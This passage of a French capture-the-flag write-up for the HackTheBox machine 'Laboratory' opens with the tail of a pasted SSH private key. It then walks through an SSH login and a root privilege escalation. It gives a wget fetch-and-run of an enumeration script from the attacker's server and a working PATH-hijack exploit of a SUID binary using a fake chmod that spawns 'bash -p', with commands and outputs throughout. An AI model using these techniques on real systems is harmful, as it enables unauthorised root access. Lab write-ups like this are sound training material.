7a8ryuqlafYIr72iV/ir4zS4VFjLw5A6Ul/xYrCud0OIGt0El5HmlKPW/kf1KeePfsHQHS
JP4CYgVRuNmqhmkPJXp68UV3djhA2M7T5j31xfQE9nEbEYsyRELOOzTwnrTy/F74dpk/pq
XCVyJn9QMEbE4fdpKGVF+MS/CkfE+JaNH9KOLvMrlw0bx3At681vxUS/VeISQyoQGLw/fu
uJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Tu ajustes ensuite ses permissions, car SSH refuse généralement d’utiliser une clé privée trop accessible :

```bash
chmod 600 dexter_id_rsa
```

#### Connexion SSH

Tu peux maintenant tenter une connexion SSH avec l’utilisateur `dexter` :

```bash
ssh -i dexter_id_rsa dexter@laboratory.htb
```

La connexion permet de sortir du contexte applicatif GitLab et d’obtenir un accès SSH avec un utilisateur système classique.

```bash
dexter@laboratory:~$
```

### user.txt

Depuis la session SSH de `dexter`, tu peux lire le premier flag :

```bash
dexter@laboratory:~$ ls -l
total 4
-r--r----- 1 root dexter 33 Jun  1 08:28 user.txt

dexter@laboratory:~$ cat user.txt
3257xxxxxxxxxxxxxxxxxxxxxxxx0750
```

À ce stade, la prise de pied est terminée : tu disposes maintenant d’un shell SSH stable avec l’utilisateur système `dexter`.





## Escalade de privilèges

{{< escalade-intro user="dexter" >}}

### Vérification des droits sudo

Comme souvent lors d’une escalade de privilèges Linux, tu commences par vérifier si l’utilisateur courant dispose de droits sudo particuliers :

```bash
sudo -l
```

Résultat :

```bash
dexter@laboratory:~$ sudo -l
[sudo] password for dexter:
Sorry, user dexter may not run sudo on laboratory.
```

L’utilisateur `dexter` ne dispose donc pas de droits sudo exploitables. Il faut chercher une autre piste d’escalade locale.

### Vérification du contexte utilisateur

Depuis la session SSH obtenue avec `dexter`, tu vérifies d’abord le contexte courant :

```bash
whoami
id
hostname
pwd
```

Résultat :

```bash
dexter@laboratory:~$ whoami
dexter

dexter@laboratory:~$ id
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)

dexter@laboratory:~$ hostname
laboratory

dexter@laboratory:~$ pwd
/home/dexter
```

Tu confirmes ainsi que tu disposes d’un accès utilisateur classique sur la machine Linux `laboratory`.

### Recherche de capabilities

Tu vérifies si certains exécutables disposent de capabilities Linux particulières :

```bash
dexter@laboratory:~$ getcap -r / 2>/dev/null
```

Résultats :

```bash
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```



Les résultats affichés correspondent à des binaires système classiques. Ils ne donnent pas ici de piste directe d’escalade de privilèges.

Tu poursuis donc l’énumération locale avec la recherche des binaires SUID.

### Recherche de binaires SUID

Tu recherches ensuite les binaires SUID présents sur le système. Pour rendre la sortie plus lisible, tu utilises `suid3num.py`, qui classe les résultats et met en évidence les binaires personnalisés intéressants.

Depuis Kali, tu vas dans le répertoire où se trouve `suid3num.py`, puis tu l’exposes avec un serveur HTTP simple :

```bash
python3 -m http.server 8000
```

Sur la machine cible, tu télécharges ensuite le script dans `/dev/shm` :

```bash
cd /dev/shm

wget http://10.10.x.x:8000/suid3num.py
```

Puis tu l’exécutes :

```bash
python3 suid3num.py
```

Dans les résultats, une section attire particulièrement l’attention :

```txt
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/local/bin/docker-security
------------------------------
```

Le script identifie donc `/usr/local/bin/docker-security` comme un binaire SUID personnalisé. Ce type de fichier mérite une analyse manuelle, car son comportement peut dépendre de commandes externes appelées pendant son exécution.



### Exploration de /usr/local/bin/docker-security

Tu commences par observer les permissions du fichier :

```bash
ls -l /usr/local/bin/docker-security
```

Résultat :

```bash
-rwsr-xr-x 1 root root 16712 Aug 28  2020 /usr/local/bin/docker-security
```

Le `s` dans les permissions indique que le bit SUID est actif. Le propriétaire du fichier étant `root`, ce programme peut s’exécuter avec les privilèges effectifs de `root`.

Tu vérifies ensuite le type du fichier :

```bash
file /usr/local/bin/docker-security
```

Résultat :

```bash
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, dynamically linked, not stripped
```

Il s’agit donc d’un binaire ELF 64 bits, dynamique, avec le bit SUID. À ce stade, l’objectif n’est pas encore de l’exploiter directement, mais de comprendre ce qu’il fait.

### Analyse avec strace

Tu passes donc à une analyse dynamique avec `strace`. Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :

```bash
strace -f -o /tmp/docker-security.strace /usr/local/bin/docker-security 2>/dev/null
```

L’option `-f` est importante, car le programme lance des processus enfants. Sans elle, tu ne verrais pas les commandes exécutées par ces sous-processus. L’option `-o` permet d’écrire la trace dans un fichier, ce qui rend l’analyse plus simple.

La redirection `2>/dev/null` masque les messages d’erreur affichés pendant l’exécution et permet de garder la sortie lisible.

Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :

```bash
grep -n "execve" /tmp/docker-security.strace
```

La sortie montre que `docker-security` lance `/bin/sh` pour exécuter deux commandes `chmod` :

```bash
execve("/bin/sh", ["sh", "-c", "chmod 700 /usr/bin/docker"], ...)
execve("/bin/sh", ["sh", "-c", "chmod 660 /var/run/docker.sock"], ...)
```

Maintenant que tu sais que `chmod` est appelé, tu filtres la trace sur ce mot-clé :

```bash
grep -n "chmod" /tmp/docker-security.strace
```

Cette fois, la sortie montre que le shell recherche `chmod` dans les répertoires du `PATH` :

```bash
stat("/usr/local/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
stat("/usr/local/bin/chmod", ...) = -1 ENOENT (No such file or directory)
stat("/usr/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
stat("/usr/bin/chmod", ...) = 0
```

Le programme finit donc par exécuter le vrai binaire `/usr/bin/chmod` :

```bash
execve("/usr/bin/chmod", ["chmod", "700", "/usr/bin/docker"], ...)
execve("/usr/bin/chmod", ["chmod", "660", "/var/run/docker.sock"], ...)
```

Cette résolution via le `PATH` est la faiblesse exploitable. Comme `docker-security` est un binaire SUID appartenant à `root`, tu peux tenter de placer un faux `chmod` dans un répertoire contrôlé, puis modifier le `PATH` pour que ce faux `chmod` soit exécuté à la place de `/usr/bin/chmod`.

### Détournement du PATH avec un faux chmod

Tu crées d’abord un faux exécutable `chmod` dans `/tmp` :

```bash
cat > /tmp/chmod << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
```

Le script contient simplement un appel à Bash avec l’option `-p`.

Cette option est importante : elle demande à Bash de conserver les privilèges effectifs hérités du programme SUID, au lieu de les abandonner.

Tu rends ensuite le faux `chmod` exécutable en appelant explicitement le vrai binaire système :

```bash
/usr/bin/chmod +x /tmp/chmod
```

Tu ajoutes maintenant `/tmp` au début du `PATH` :

```bash
export PATH=/tmp:$PATH
```

Tu peux vérifier que ton faux `chmod` est bien celui qui sera trouvé en premier :

```bash
which chmod
```

Résultat attendu :

```bash
/tmp/chmod
```

Enfin, tu relances le binaire SUID :

```bash
/usr/local/bin/docker-security
```

Comme `/tmp` est placé avant les répertoires système dans le `PATH`, l’appel à `chmod` déclenche ton faux script au lieu du vrai binaire système.

Tu obtiens alors un shell Bash :

```bash
root@laboratory:~#
```

Tu vérifies les privilèges effectifs du shell :

```bash
id
```

Résultat :

```bash
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
```

Le shell s’exécute donc directement avec les privilèges de `root`.

### root.txt

Tu peux maintenant lire le flag final :

```bash
cat /root/root.txt
1126xxxxxxxxxxxxxxxxxxxxxxxxxxxad07
```

La lecture de `root.txt` confirme que tu as pris le contrôle complet de la machine avec les privilèges `root`. Cette étape termine l’escalade de privilèges et marque la fin du challenge CTF.

---

## Conclusion

La machine `Laboratory` propose une progression cohérente depuis l’énumération initiale jusqu’à l’obtention de l’accès root. La découverte du sous-domaine `git.laboratory.htb` permet d’identifier une instance GitLab vulnérable à `CVE-2020-10977`, puis de l’exploiter afin d’obtenir une première exécution de commandes sur la cible.

À partir de cet accès, l’analyse des dépôts Git présents sur le serveur permet de récupérer des informations utiles et de pivoter vers l’utilisateur `dexter` via SSH. L’escalade de privilèges repose ensuite sur le binaire SUID `/usr/local/bin/docker-security`. Son observation avec `strace` montre qu’il appelle `chmod` sans chemin absolu, ce qui permet de détourner le `PATH` avec un faux binaire contrôlé.

Cette machine illustre donc bien une chaîne d’exploitation classique en environnement Linux : énumération, prise de pied applicative, récupération d’une clé SSH, accès utilisateur, puis escalade locale grâce à une mauvaise gestion des chemins d’exécution.

---



{{< feedback >}}